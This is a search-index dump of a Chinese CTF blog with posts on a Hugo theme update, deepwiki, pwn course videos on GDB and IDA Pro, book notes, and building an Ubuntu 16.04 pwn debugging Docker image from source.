[{"categories":["Announcement"],"content":"About my blog","date":"2023-04-05","objectID":"/zh-cn/2023-04-05-announcement-about-my-blog/","tags":["blog"],"title":"[置顶] 博客站点说明","uri":"/zh-cn/2023-04-05-announcement-about-my-blog/"},{"categories":["Announcement"],"content":" 关于本站博客。 太长不读: 👉 点击右上角的选择语言 按钮切换语言至英语，阅读英文博客 👉 使用搜索框搜索文章 👉 原站点的所有文章均被保留，试着去找到你所需要的文章吧~ 👉 仍有疑问，发邮件至 roderickchan@foxmail.com 我有两个相同的博客网站： https://roderickchan.github.io https://www.roderickchan.cn 我在Github Pages和国内阿里云VPS上部署了这两个完全相同的网站，这样做是为了提高访问速度并做好博客备份。中文和英文博客会存储在不同的文件夹中，因此，你需要单击“语言切换”按钮来切换语言并阅读更多博客。 如果遇到“您要查找的页面不存在”的错误，请不要担心，因为我最近重新调整了网站设置，导致某些链接发生了更改。你可以使用关键字在我的博客网站上搜索文章，搜索框位于页面右上角。例如，您可以使用\"house of apple\"搜索与\"house of apple\"相关的所有文章。 如果您无法找到搜索结果，请切换到另一种语言再次尝试。如果仍然无法找到您要查找的内容，则可能是因为我没有写关于您搜索主题的博客。😅 一些原有的博客链接需要进行替换，比如https://www.roderickchan.cn/2023-02-20-the-art-of-shellcode/需要替换为https://www.roderickchan.cn/zh-cn/2023-02-20-the-art-of-shellcode/后才能访问。 ","date":"2023-04-05","objectID":"/zh-cn/2023-04-05-announcement-about-my-blog/:0:0","tags":["blog"],"title":"[置顶] 博客站点说明","uri":"/zh-cn/2023-04-05-announcement-about-my-blog/"},{"categories":["tools"],"content":"use deepwiki to learn github repos","date":"2025-06-08","objectID":"/zh-cn/2025-06-08-update-hugo-blog/","tags":["AI","hugo","blog"],"title":"三年一更之博客主题更新","uri":"/zh-cn/2025-06-08-update-hugo-blog/"},{"categories":["tools"],"content":" 很久没有更新博客的主题了。目前采用的FixIt主题功能比较全面，就是配置稍微有些复杂。早些时候，我就在滴答清单里面写下了要更新博客主题的task，忙了一阵又一阵，昨天晚上到今天终于把这个事情给忙活完了。总的来说，工作量上除了继承主题已有的更新，例如：合集、侧边栏、相关内容推荐、右侧目录等，还实现了如下几个功能：clustrmaps显示访客地点和数量、AI全文摘要、主页添加自己的微信公众号、添加留言板等。 FixIt主题更新\r这次更新属于是把配置文件重新写了一遍，并且按照作者的doc的配置风格，对自己的博客站点做了适配。大部分时间，就是在理解配置的含义，以及修改对应配置为自己博客站点所需要的字段。主要涉及的更新有以下内容。更新完后，每篇文章大概长这样： 添加合集功能\r合集等于是在文章侧边添加了一个目录，这个目录下可以导航到合集内的其他所有文章。这个功能是我一直想要的，后来也看着作者在慢慢实现。只需要按照他提供的模板文件的配置，在对应的文章里面添加合集这个元数据字段即可。目前已经添加了两个合集，显示如下： 然后，在对应的文章下显示是这样的： 不得不说，合集是个好功能，各大博客主题都应该引入这一特性，方便阅读。 侧边栏\r上面说的合集是放置到侧边栏的，实际上，侧边栏还有两个小组件，一个是相关内容推荐。看了下，好像是hugo根据关键字、标签、类别等文章的元数据字段计算出两篇文章的相似性，然后按照相似性的高低排序进行推荐。总的来说，丰富了博客的内容，还是相当不错的。 除了相关内容外，FixIt的主题文档左侧还添加了一个图片，作者给的是他的知识星球的链接，我就改成了微信公众号的链接。反正就是替换下图片的URL而已，没什么太大的改动量。侧边栏显示如下： 上面是合集，下面是相关内容推荐，然后下面就是微信公众号图片。需要说明的是，在移动设备上，侧边栏默认会收起来，避免影响文章的阅读。 右侧目录的小组件\r其实就是在目录的上面新加了作者的头像和一个关注按钮，点击头像可以直接跳转到作者的主页，点击按钮可以跳转到github地址。总的来说，是美化博客的小功能，显示如下： 关注按钮实现了小小的动画，很精致~ 谷歌CSE搜索\r这个功能其实不错，但是由于我有两个博客，且对应有中文和英文文章，所以需要开启四个cse站点，实在是太麻烦了，所以我选择的还是fuse.js的搜索方案，这个方案是最简单的，不需要任何其他的配置。 扯远了，先说谷歌的cse搜索，到https://programmablesearchengine.google.com/这里去注册搜索引擎，只需要填写好下面的内容即可： 要保证搜索结果的准确性的话，需要指定在指定网站中搜索，按照提示的规则将你的博客网站url填写进去。然后，创建成功后会给一个cx，接着访问 https://cse.google.com/cse?cx=YOUR-CX-CODE，注意，替换YOUR-CX-CODE，就可以开始搜索。比如说，我搜索读书，显示结果如下： 不得不说，这个搜索很不错。特别是，algolia限制了上传的索引对象的大小为10K，只要文章稍微长一点，特别是中文文章，很容易就超出限制。索性我就不用algolia，用谷歌自带的还是很香的。当然，最简单还是fuse.js搞定，避免了过多复杂的配置。 多语言翻译\r作者还实现了一个模块hugo-fixit/cmpt-translate: 🌐 A component for site automatic translation.这个模块基于translate.js实现了多语言自动翻译。特性是：每日翻译字符 200 万！无语言配置文件、无 API Key、对 SEO 友好！ 这么好的组件，还要啥自行车，直接给安排上。注意，这个组件是在对应的文章没有对应语言版本的时候，可以自动翻译，显示的效果如下： 比如把这篇文章翻译为小日子： 这下博客网站真成国际站了2333 自己DIY\rhugo是基于模板渲染markdown文件的，而FixIt主题也提供了自定义组件的方式。可以在每个页面的header、footer等部位注入HTML代码。作者的配置文档很清晰，可以注入代码的地方主要有： [customPartials] head = [ # \"inject/component-projects.html\", # \"inject/shortcode-rewards.html\", ] menuDesktop = [ \"inject/translate-menu-desktop.html\", ] menuMobile = [ \"inject/translate-menu-mobile.html\", ] profile = [ \"custom/profile.html\", ] aside = [ \"custom/aside.html\", ] comment = [] footer = [\"custom/footer.html\"] widgets = [] assets = [ # \"custom/use-assets.html\", \"inject/cmpt-translate.html\", # \"inject/shortcode-caniuse.html\", ] postTocBefore = [ \"custom/follow-me.html\", ] postTocAfter = [] postContentBefore = [\"custom/ai-summary.html\"] postContentAfter = [] postFooterBefore = [] postFooterAfter = [] 有些不需要的，我就注释掉了。总的来说，注入的部分有以下内容。 AI全文摘要\r众所周知，现在是AI盛行的时代。其实主题里面作者已经实现了一个postSummary组件。但是，这个组件是基于洪墨AI - 网站智能客服和智慧搜索搭建工具这个实现的。一来要收费，二来收费还挺贵。咱也不知道他用的是什么模型，但是从网上的帖子来看，几百万token用的很快，没几篇文章总结完就又得再充钱了。不得不说，要是有时间，我也想做个类似的产品出来。毕竟实现起来非常简单。 其实自己想要实现这一功能的话，也不是很难。如果做成服务的话，涉及的防盗、错误处理等比较复杂。所以，思路如下： 调用大模型为每篇文章生成一个摘要，大约100字 把摘要内容写到博客的summary元数据上 在postContentBefore这里注入代码，写一个机器人的框框，然后使用typeit把博客的summary内容渲染出来 只需要三步，就能实现相同的功能。而且可以在本地选择模型，比如deepseek就很便宜，我的140篇文章，大约28字的博客内容，总结了140篇摘要只花了0.8人民币。如果把摘要的字缩短一点，可能耗费的token更少。 最后出来的效果是这样子的： 那么这里所需的前后端也不需要自己写，直接上trae。没错，这个IDE也能用claude 4，实际体验和cursor差不多。最重要的是，首月只需要3美刀！ 话不多说，前端代码，也就是custom/ai-summary.html如下： {{- if .Params.summary -}} \u003cdiv class=\"ai-summary-container\" style=\"margin: 20px 0; padding: 20px; border: 2px solid #e1e5e9; border-radius: 12px; background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%); box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);\"\u003e \u003cdiv class=\"ai-summary-header\" style=\"display: flex; align-items: center; margin-bottom: 15px;\"\u003e \u003ch3 class=\"ai-summary-title\" style=\"margin: 0; color: #495057; font-size: 18px; font-weight: 600;\"\u003e 🤖 本文的AI摘要 \u003c/h3\u003e \u003c/div\u003e \u003cdiv class=\"typeit\" data-speed=\"50\" data-cursor-speed=\"1000\" data-cursor-char=\"|\" style=\"margin: 0; line-height: 1.6; color: #6c757d; font-size: 14px;\"\u003e \u003ctemplate\u003e{{ .Params.summary | markdownify | safeHTML }}\u003c/template\u003e \u003c/div\u003e \u003c/div\u003e \u003c!-- 响应式样式 --\u003e \u003cstyle\u003e @media (max-width: 768px) { .ai-summary-container { margin: 15px 0 !important; padding: 15px !important; } .ai-summary-title { font-size: 16px !important; } .ai-summary-content { padding: 12px !important; } .ai-summary-content p { font-size: 13px !important; } } /* 深色模式支持 */ @medi","date":"2025-06-08","objectID":"/zh-cn/2025-06-08-update-hugo-blog/:0:0","tags":["AI","hugo","blog"],"title":"三年一更之博客主题更新","uri":"/zh-cn/2025-06-08-update-hugo-blog/"},{"categories":["tools"],"content":"use deepwiki to learn github repos","date":"2025-05-09","objectID":"/zh-cn/2025-05-09-use-deepwiki-to-understand-github-repos/","tags":["AI","pwncli"],"title":"使用 deepwiki 学习使用开源代码","uri":"/zh-cn/2025-05-09-use-deepwiki-to-understand-github-repos/"},{"categories":["tools"],"content":" 使用 deepwiki 快速了解 github 上开源代码的工作流程和原理 介绍\r两周前，有一款现象级的 AI 产品又诞生了，那就是 deepwiki。官网的介绍为：DeepWiki provides up-to-date documentation you can talk to, for every repo in the world. Think Deep Research for GitHub。因此，deepwiki 被誉为“Github 的维基百科”。对于一个开源代码的开发原理、开发流程的问题，都可以通过 deepwiki 来寻求答案。 官网如图所示： 可以搜索和点击某个仓库的链接，查看仓库对应的文档和示例。 Pwncli 的 Deepwiki 示例\r看到这个产品的时候，我首先想到的是用自己开源的 pwncli 仓库试一试。使用 deepwiki 的方式也很简单，直接将对应的 github 仓库的域名替换为 deepwiki.com 即可，如果该仓库已经被索引，那么会直接出来构建好的文档界面；如果该仓库还没有被索引，那么可以提出申请，文件构建完毕就会发送邮件通知。 pwncli 的 deepwiki 界面如下所示： 大体上是根据项目的 readme 文档以及仓库的代码所构建出来的，左侧的目录基本上和我的 readme 的目录是一致的。 上述页面的中间是具体的内容，右面则是每个章节的子目录。整体上看，deepwiki 构建出来的文档结构是非常清晰的。 特别值得注意的是，下面有一个问答框，可以直接搜索与这个仓库有关的任何问题。这个点很好地结合了现在大语言模型时代的特点，用户可以通过一个问答框与大模型来交互，获取自己想要了解的任何知识。 整体来说，deepwiki 构建出来的文档是层次清晰、内容全面的。比如，关于 pwncli 的命令结构，使用 mermaid 图绘制了其层次结构： 然后，其还展示了每个命令有哪些参数，如何设置，具体的实现细节等。通过关键文字和图标丰富地展示了这个仓库的内容。比如对于 debug 子命令，其工作流程如下所示： 整体来看，deepwiki 总结出来的内容比较翔实，省去了大家撰写文档的时间。 目前，这个链接我已经更新到了 readme 文档上面，点击对应的链接即可进入到文档。我只能说：真好，我不用写 doc 了。 我的想法\r总的来说，这个工具还是非常有帮助的。直接借助 LLM 的力量来阅读和理解代码，可以节省很多看代码的时间。但是，我感觉这个产品还是存在一些缺点： 信息冗余严重。重复的内容过多，会反复出现 展示方式千篇一律。基本都是 mermaid 图加上表格，看不到其他的展示形式 内容简单，缺乏思考和凝练。也就是说，这个工具只涉及到知识的展示，知识的加工上还是略显不足的 问答的准确性还有待提高。当然，可能也受限于大模型本身的能力，我发现大部分问题的回答还是不尽如人意 不过瑕不掩瑜。这个工具还是很值得尝试的，特别是刚拿到一个代码库的时候，可以借助他快速地了解这个代码库的组成结构，工作原理等 我想，大模型时代，一切都必须要积极地拥抱 AI，只有这样，才不会被时代所抛弃。我们不会被 AI 淘汰，更是会借助这个强大的工具，发展出更先进的生产力。 目前文中的外部链接需要复制后到浏览器中打开，推荐点击下方阅读原文可直接跳转到博客网站上阅读。 欢迎关注我的公众号roderick blog，原创文章第一时间推送~ ","date":"2025-05-09","objectID":"/zh-cn/2025-05-09-use-deepwiki-to-understand-github-repos/:0:0","tags":["AI","pwncli"],"title":"使用 deepwiki 学习使用开源代码","uri":"/zh-cn/2025-05-09-use-deepwiki-to-understand-github-repos/"},{"categories":["pwn1pwn"],"content":"介绍GDB的调试指南","date":"2024-06-29","objectID":"/zh-cn/2024-06-29-pwn1pwn-course-4/","tags":["pwn","pwn1pwn","course","GDB","debugger"],"title":"【快来pwn1pwn】4-GDB调试指南","uri":"/zh-cn/2024-06-29-pwn1pwn-course-4/"},{"categories":["pwn1pwn"],"content":" 快来 pwn1pwn 系列公开课第 4 集【GDB调试指南】 今天发布的是第 4 集，课程内容介绍如下： 本节课是【快来pwn1pwn】系列公开课的第4节课，主要讲解了Linux系统上著名调试工具GDB(GNU Project Debugger)的使用方法。视频内容依次是：1）GDB简要介绍；2）GDB的基本概念与基本命令；3）GDB的高级用法；4）GDB的实用调试技巧；5）介绍 GDB中常用插件pwndbg的相关命令，并介绍了适用于调试堆、IO_FILE的另一个插件pwngdb的命令；6）分享GDB的学习资源 上集\r课程视频可以在 Bilibili 上观看： 或者在 Youtube 上观看： 下集\r课程视频可以在 Bilibili 上观看： 或者在 Youtube 上观看： 欢迎关注我的公众号roderick blog，原创文章第一时间推送~ ","date":"2024-06-29","objectID":"/zh-cn/2024-06-29-pwn1pwn-course-4/:0:0","tags":["pwn","pwn1pwn","course","GDB","debugger"],"title":"【快来pwn1pwn】4-GDB调试指南","uri":"/zh-cn/2024-06-29-pwn1pwn-course-4/"},{"categories":["reading"],"content":"《亲密关系》的读书笔记","date":"2024-06-28","objectID":"/zh-cn/2024-06-28-qinmiguanxi-reading-notes/","tags":["亲密关系","reading notes"],"title":"【读书笔记】亲密关系————克里斯多福・孟","uri":"/zh-cn/2024-06-28-qinmiguanxi-reading-notes/"},{"categories":["reading"],"content":" 我们每个人都应该妥善地处理好亲密关系\r我们从小总以为，等我们长大了，我一定会幸福。总有那么一个人等着我，王子跟公主从此美好的生活在一起了。但正是一次次的“幻灭”，才让我们学会了成长。许多没有学会幻灭的人，才真正可怕。就像有些好莱坞的明星那样，即使离20多次婚，还在不停地寻找，那个幻想中最美好的人。但是他们，一辈子都可能找不到想要的那个对象。所以，接受到了“幻灭”这件礼物的人，就能明白：只有当我们哪天开始向内索取，幸福才会真正到来。 ——克里斯多福・孟 《亲密关系》\r这是我在阅读完《亲密关系》这本书后有感而写下的。书籍封面如下： 一段时间后，我又看到了另一本亲密关系，书籍如下： 这才发现，我好像看错书了。本来是想看这一本，结果看成上了上一本。本篇博客记录的是上一本的读后感。看完之后，发现上一本也还不错~ 前言\r起初，我打算写一篇关于王阳明心学的文章。为此，前段时间还特意把度阴山所编写的《王阳明传》重新浏览了一遍。但在此期间，我和小妹发生了一次小小的争吵，争吵后进行了一场深入心灵的沟通。这个小插曲使我改变了最初的计划，我决定先写一写关于亲密关系的思考。 陆游有诗：纸上得来终觉浅，绝知此事要躬行。看到亲密关系这本书后，我如获至宝。我本以为自己可以很好地把控自己所经历的亲密关系，特别是学习了书本中的相关理论，使我的信心增强了不少。可是生活很快给我上了一课，告诉我亲密关系的处理并没有那么简单。 阅读《亲密关系》的时候，发现自己能很敏锐地感知到亲密关系中的变化，这其实也是对知行合一的最好诠释。所以，本篇博客看似未写王阳明心学地内容，但所经历和和描述的，却处处都有他们的影子。 亲密关系的发展阶段\r在这里，我不会长篇大论，也不会对亲密关系做很细致的诠释，而只是对书中所提及的亲密关系的发展阶段进行概括性的总结。如果对亲密关系中的细节有任何疑问，可以直接阅读《亲密关系》这本书。相信我，阅读完这本书后，它会带给你一些惊喜和思考。 总的来看，作者认为一段亲密关系一定会经历四个阶段：月晕、幻灭、内省和启示。这几个词是对一段亲密关系的不同阶段进行描述。很多时候，一段关系在幻灭阶段就走向了灭亡。 对所经历的阶段做一个简要描述： ● 🌒 月晕：月晕阶段对应着恋爱关系的蜜月期，大多时候指的是两个人刚在一起的那段时期。这个时候，另一半在我们的眼中总是散发着光芒，我们的目光主要集中在另一半的优点上，并会不断地把优点放大。在这个阶段，当我们发现对方地缺点时，总是会下意识地忍耐或忽略。 ● 👻 幻灭：幻灭阶段对应的是恋爱关系的争吵期，这个时候，两个人开始有争吵，开始发现对方的不足，开始抱怨对方的缺点，开始对对方感到失望。此时，我们会很容易注意到对方的不好地行为或言语，并会将其默默地\"存储\"起来，直到有一天争吵的时候彻底爆发。 ● 🙅‍♂️ 内省：内省阶段对应着恋爱的磨合期。我们会意识到，我们之所以对对方满怀期待，都是对自己满怀期待；我们所责怪的对方的缺点，都是对自己内心的投射。我们开始自我反省，开始用爱去包裹自己与对方相处。这一阶段可能会很漫长，可能会很痛苦，但是，两个人的感情将在这一阶段有质的升华。 ● 🤔 启示：如果能达到这一阶段，两个人会手牵手，心连心，互相成为彼此的灵魂伴侣。 我的体验和感悟\r由于自己也经历着亲密关系，和小妹的关系，和家人朋友的关系。所以，在读完书后，我开始审视与自己的亲密关系。结合自己现实生活中所经历的，有如下几点感悟： 任何亲密关系，其中的每一个阶段，我们都一定会经历 马克思主义哲学的客观规律告诉我们，事物的发展不以人的意志为转移。最开始我的想法是：我读完了《亲密关系》，我知道亲密关系要经历哪些阶段，我知道哪些阶段很难渡过，我就能避免陷入到那些不好的阶段。事实上，这样的想法是违背亲密关系发展规律的。书中所提到的亲密关系的四个阶段，后一个阶段都是在前一个阶段的基础上发展出来的，如果没有前一个阶段做铺垫，永远都不会都到后一个阶段。也就是说，亲密关系想要走向成熟，一定会经历这四个阶段。任何处在亲密关系中的人都是无法避免和无法绕过的。因此，我们只需要怀着坦然的内心，去经历，去接受，去创造。在亲密关系发展的期间，将书中所学运用到实际，使亲密关系朝着健康的方向发展。\r亲密关系的发展阶段不是严格递进的 马克思主义哲学又说道：事物是运动的，没有绝对静止的事物。事物是发展的，且事物的发展以螺旋上升的形式呈现。亲密关系也是一种事物，其发展过程也必然遵循这一规律。也就是说，亲密关系的发展并不一定严格按照上述所说的四个阶段逐次递进。我们所经历的亲密关系可能会反复地徘徊在几个阶段之间。也许，一段亲密关系在走向成熟地过程中会经历：月晕-\u003e幻灭-\u003e月晕-\u003e幻灭-\u003e内省-\u003e幻灭-\u003e启示，这样及其复杂而漫长的过程。其可能会在几个阶段间反复横跳，也可能长期停留在某一个阶段。但是我们应当相信，亲密关系的发展趋势一定是：月晕-\u003e幻灭-\u003e内省-\u003e启示。只要我们彼此深爱着对方，最终一定会走到启示阶段，尽管这一过程可能是曲折的、波动的。借用毛主席的两句话：前途是光明的，道路是曲折的。\r亲密关系的良药是理解、沟通和爱 维持好一段亲密关系，只需要：理解、沟通和爱。理解是站在对方的角度去思考问题；沟通是双方在出现分歧与矛盾时，能坐下好好好交流；爱则是源自内心的情感。当一切从爱出发，理解与沟通就会变得非常简单。亲密关系需要好好经营，但是我们也不必刻意地去经营。从自己的内心出发，从良知出发，从爱出发，亲密关系一定也必然会走向成熟。\r总结\r书本中所提到的亲密关系需要经历四个阶段：月晕、幻灭、内省和启示。 任何亲密关系，其中的每一个阶段，我们都一定会经历 亲密关系的发展阶段不是严格递进的 亲密关系的良药是理解、沟通和爱 在之后的博客中，我会继续写一写与小妹的恋爱故事，那些美好且值得品味的回忆~ 欢迎关注我的公众号roderick blog，原创文章第一时间推送~ ","date":"2024-06-28","objectID":"/zh-cn/2024-06-28-qinmiguanxi-reading-notes/:0:0","tags":["亲密关系","reading notes"],"title":"【读书笔记】亲密关系————克里斯多福・孟","uri":"/zh-cn/2024-06-28-qinmiguanxi-reading-notes/"},{"categories":["pwn-trick"],"content":"How to build a Ubuntu 16.04 docker image for pwn debugging","date":"2024-04-14","objectID":"/zh-cn/2024-04-14-docker-pwn-env-image-for-ubuntu-16.04/","tags":["docker","pwn"],"title":"在2024年如何成功搭建Ubuntu 16.04的pwn环境","uri":"/zh-cn/2024-04-14-docker-pwn-env-image-for-ubuntu-16.04/"},{"categories":["pwn-trick"],"content":" 在 2024 年搭建一个 Ubuntu 16.04 的 pwn 环境。 前言\r之前维护了一个基于 Ubuntu 的调试 pwn 题的 docker 镜像，现有的镜像列表 可点击查看，摘录部分如下： Ubuntu Version Glibc Version Pull command User/Password Status Ubuntu 24.04 2.39-0 ubuntu 8 docker pull roderickchan/debug_pwn_env: 24.04-2.39-0 ubuntu 8-20240412 1. root/root 2. ctf/ctf 🚩Updating Ubuntu 23.10 2.38-1 ubuntu 6.1 docker pull roderickchan/debug_pwn_env: 23.10-2.38-1 ubuntu 6.1-20240202 1. root/root 2. ctf/ctf 🚩Updating Ubuntu 23.04 2.37-0 ubuntu 2.2 docker pull roderickchan/debug_pwn_env: 23.04-2.37-0 ubuntu 2.2-20231211 1. root/root 2. ctf/ctf 🚩Updating Ubuntu 22.04 2.35-0 ubuntu 3.6 docker pull roderickchan/debug_pwn_env: 22.04-2.35-0 ubuntu 3.6-20240113 1. root/root 2. ctf/ctf 🚩Updating Ubuntu 20.04 2.31-0 ubuntu 9.14 docker pull roderickchan/debug_pwn_env: 20.04-2.31-0 ubuntu 9.14-20231211 1. root/root 2. ctf/ctf 🚩Updating Ubuntu 21.10 2.34-0 ubuntu 3.2 docker pull roderickchan/debug_pwn_env: 21.10-2.34-0 ubuntu 3.2-20220707 1. root/root 2. roderick Archived Ubuntu 21.04 2.33-0 ubuntu 5 docker pull roderickchan/debug_pwn_env: 21.04-2.33-0 ubuntu 5-20220908 1. root/root 2. roderick Archived Ubuntu 18.04 2.27-3 ubuntu 1.6 docker pull roderickchan/debug_pwn_env: 18.04-2.27-3 ubuntu 1.6-20230213 1. root/root 2. roderick Archived Ubuntu 16.04 2.23-0 ubuntu 11.3 docker pull roderickchan/debug_pwn_env: 16.04-2.23-0 ubuntu 11.3-20240412 1. root/root 2. ctf/ctf 🚩Updating 主要的变动是相较于之前的镜像，新增了 Ubuntu-16.04 的镜像。 新增镜像主要是由于有位师傅提了一个 issue： 其实很久之前，我自己确实配过一个 Ubuntu-16.04 的调试 pwn 的镜像，但是没有把 Dockerfile 文件留下来，也没有把镜像保存下来。今年已经是 2024 年了， Ubuntu 16.04 已经是 8 年前的系统，很多软件已不支持 Ubuntu 16.04 的环境。不过，既然有师傅提出这个需求，那就必须制作一个 Ubuntu 16.04 的版本的调试环境，毕竟很多入门 pwn 的师傅在学习堆的时候，都是从 glibc-2.23 开始的，而 Ubuntu 16.04 使用的就是这个版本的 glibc。 需要说明的是，以下升级软件的时候，尽量使用 root 用户执行命令，从而能全局安装，如果对升级软件的细节不感兴趣，可以直接跳到最后查看最终的 Dockerfile 文件内容。 安装必备软件\r首先安装一些必备软件，执行以下命令即可： apt-get update \u0026\u0026 apt-get -y dist-upgrade \u0026\u0026 apt-get install -y --fix-missing python3 python3-pip python3-dev lib32z1 \\ xinetd curl gcc g++ gdbserver git libssl-dev libffi-dev build-essential tmux \\ vim iputils-ping \\ file net-tools socat locales autoconf automake libtool make wget 升级 Ruby 到 2.7\r目前 Ubuntu 16.04 制作 pwn 调试环境的镜像遇到的问题都是软件的版本过低，无法满足现有工具的依赖需求。 在构建镜像的时候，第一步就是重新了编译一份 runy 2.7 ，对应的构建语句为： wget http://ftp.ruby-lang.org/pub/ruby/2.7/ruby-2.7.1.tar.gz \u0026\u0026 \\ tar -xzvf ruby-2.7.1.tar.gz \u0026\u0026 \\ cd ruby-2.7.1/ \u0026\u0026 \\ ./configure \u0026\u0026 \\ make -j16 \u0026\u0026 \\ make install -j16 升级后，就可以安装 one_gadget 和 seccomp-tools 了，安装语句为： gem install one_gadget seccomp-tools 升级 Python 到 3.8\rUbuntu 16.04 的自带的原有的 python 版本是 3.5，版本非常低。导致在 Ubuntu 16.04 系统上运行 python 程序最经常遇到的错误是：python 3.5 不支持 f-string，也就是 f\"name: {name}\" 这种语法是会直接报错的。所以，我选择将 python 版本升级到 python 3.8。事实上，你也可以升级到最新的版本，但我认为 3.8 已经够用了，所以目前编译的是 3.8 版本。 要从源码编译 python 3.8，执行以下命令即可： apt-get install -y zlib1g-dev libbz2-dev libncurses5-dev libsqlite3-dev libreadline-dev tk-dev libgdbm-dev \\ libdb-dev libpcap-dev xz-utils libexpat1-dev liblzma-dev libc6-dev \u0026\u0026 \\ wget https://www.python.org/ftp/python/3.8.6/Python-3.8.6.tgz \u0026\u0026 \\ tar -xzvf Python-3.8.6.tgz \u0026\u0026 \\ cd Python-3.8.6 \u0026\u0026 \\ ./configure --enable-optimizations \u0026\u0026 \\ make -j16 \u0026\u0026 make install -j16 \u0026\u0026 rm -rf /usr/bin/pip3 /usr/bin/python3 /usr/bin/python /usr/bin/pip \u0026\u0026 \\ ln -s /usr/local/bin/python3.8 /usr/bin/python3 \u0026\u0026 \\ ln -s /usr/local/bin/python3.8 /usr/bin/python \u0026\u0026 \\ ln -s /usr/local/bin/pip3.8 /usr/bin/pip3 \u0026\u0026 \\ ln -s /usr/local/bin/pip3.8 /usr/bin/pip 升级 Gdb 到 10.2\r从 apt 命令安装的 gdb 默认会使用 python 3.5，这样也就无法安装较新的 pwndbg 插件。所以，我们需要手动升级一下 gdb，编译安装 gdb 10.2。编译安装的命令如下： apt-get install -y texinfo \u0026\u0026 \\ wget https://ftp.gnu.org/gnu/gdb/gdb-10.2.tar.gz \u0026\u0026 \\ tar -xzvf gdb-10.2.tar.gz \u0026\u0026 cd gdb-10.2 \u0026\u0026 ./configure --enable-targets=all \u0026\u0026 \\ make -j16 \u0026\u0026 make install -j16 这里的命令需要说明的是，由于 pwndbg 目前启动了虚拟环境，所以在遇到了 ImportError: urllib3 v2.0 only supports OpenSSL 1.1.1+, currently the ‘ssl’ module is compiled with OpenSSL 1.0.2g 错误的时候，需要升级一下 urllib3 的版本，执行的命令是：./.venv/bin/pip3 install --upgrade --force-reinstall 'requests==2.6.0' urllib3。最后，在全局环境也执行一下这个命令。 安装 Pwndb","date":"2024-04-14","objectID":"/zh-cn/2024-04-14-docker-pwn-env-image-for-ubuntu-16.04/:0:0","tags":["docker","pwn"],"title":"在2024年如何成功搭建Ubuntu 16.04的pwn环境","uri":"/zh-cn/2024-04-14-docker-pwn-env-image-for-ubuntu-16.04/"},{"categories":["pwn1pwn"],"content":"介绍IDA Pro的基本使用","date":"2024-03-19","objectID":"/zh-cn/2024-03-19-pwn1pwn-course-3/","tags":["pwn","pwn1pwn","course","IDA Pro"],"title":"【快来pwn1pwn】3-IDA使用方法","uri":"/zh-cn/2024-03-19-pwn1pwn-course-3/"},{"categories":["pwn1pwn"],"content":" 快来 pwn1pwn 系列公开课第 3 集【IDA使用方法】 今天发布的是第 3 集，课程内容介绍如下： 本节课是【快来pwn1pwn】系列公开课的第3节课，主要讲解了逆向软件IDA Pro的使用方法。视频内容依次是：1）IDA Pro简介；2）IDA Pro的常见界面与窗口的详细说明；3）IDA Pro的常见功能，包括如何创建结构体、常用快捷键等；4）IDA Pro的远程调试详细介绍；5）IDA Pro的学习资源、插件、参考资料等 课程视频可以在 Bilibili 上观看： 或者在 Youtube 上观看： 课件很长，就不贴图片啦~ IDA Pro权威指南下载链接： 中文版： https://download.roderickchan.cn/ctf/2024-pwn1pwn/IDA-Pro%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E7%AC%AC2%E7%89%88.pdf 英文版： https://download.roderickchan.cn/ctf/2024-pwn1pwn/The.IDA.Pro.Book.2nd.Edition.Jun.2011.pdf 课后练习的题目下载链接： fruit_debug 下载地址： https://download.roderickchan.cn/ctf/2024-pwn1pwn/fruit/fruit_debug fruit_release 下载地址： https://download.roderickchan.cn/ctf/2024-pwn1pwn/fruit/fruit_release 对课程有任何问题可以随时留言与我交流~ 欢迎关注我的公众号roderick blog，原创文章第一时间推送~ ","date":"2024-03-19","objectID":"/zh-cn/2024-03-19-pwn1pwn-course-3/:0:0","tags":["pwn","pwn1pwn","course","IDA Pro"],"title":"【快来pwn1pwn】3-IDA使用方法","uri":"/zh-cn/2024-03-19-pwn1pwn-course-3/"},{"categories":["pwn1pwn"],"content":" 快来 pwn1pwn 系列公开课第 2 集【 pwn 基本环境与工具】 今天发布的是第 2 集，内容为 pwn 基本环境与工具。 课程视频可以在 Bilibili 上观看： 或者在 Youtube 上观看： 本节课是【快来 pwn1pwn 】系列公开课的第2节课，主要讲解了 pwn 基本环境与工具。视频中介绍了入门 pwn 需要使用和学习哪些基本的工具，如何搭建基本的 pwn 环境，以及分享了博主目前使用的 pwn 环境。 视频的图文简介如下： 对课程有任何问题，可以与我留言或邮件交流~ 欢迎关注我的公众号roderick blog，原创文章第一时间推送~ ","date":"2024-03-10","objectID":"/zh-cn/2024-03-10-pwn1pwn-course-2/:0:0","tags":["pwn","pwn1pwn","course","IDA"],"title":"【快来pwn1pwn】2-pwn基本环境与工具","uri":"/zh-cn/2024-03-10-pwn1pwn-course-2/"},{"categories":["pwn1pwn"],"content":"快来pwn1pwn系列公开课","date":"2024-03-03","objectID":"/zh-cn/2024-03-03-pwn1pwn-course-1/","tags":["pwn","pwn1pwn","course"],"title":"【快来pwn1pwn】1-课程介绍","uri":"/zh-cn/2024-03-03-pwn1pwn-course-1/"},{"categories":["pwn1pwn"],"content":" 快来 pwn1pwn 系列公开课第 1 集【课程介绍】 快来 pwn1pwn 系列公开课开始更新啦~ 今天发布的是第 1 集，课程内容介绍。 课程视频可以在 Bilibili 上观看： 或者在 Youtube 上观看： 本节主要介绍了课程的内容： 本课程针对的是小白与新手： 课程的发布平台如下： 最后是其他说明： 下节课预告： 对课程有任何问题，可以与我留言或邮件交流~ 欢迎关注我的公众号roderick blog，原创文章第一时间推送~ ","date":"2024-03-03","objectID":"/zh-cn/2024-03-03-pwn1pwn-course-1/:0:0","tags":["pwn","pwn1pwn","course"],"title":"【快来pwn1pwn】1-课程介绍","uri":"/zh-cn/2024-03-03-pwn1pwn-course-1/"},{"categories":["reading"],"content":"活着的读书笔记","date":"2024-01-20","objectID":"/zh-cn/2024-01-20-huozhe-reading-notes/","tags":["余华","reading notes"],"title":"【读书笔记】活着————余华","uri":"/zh-cn/2024-01-20-huozhe-reading-notes/"},{"categories":["reading"],"content":" 这是某日在回学校的高铁上写的读书笔记，之后略有删改。主要是回忆了整篇小说的内容，写了一些自己的感受与想法。我文笔不好，却总爱胡乱写些东西，大家也胡乱看看便是。 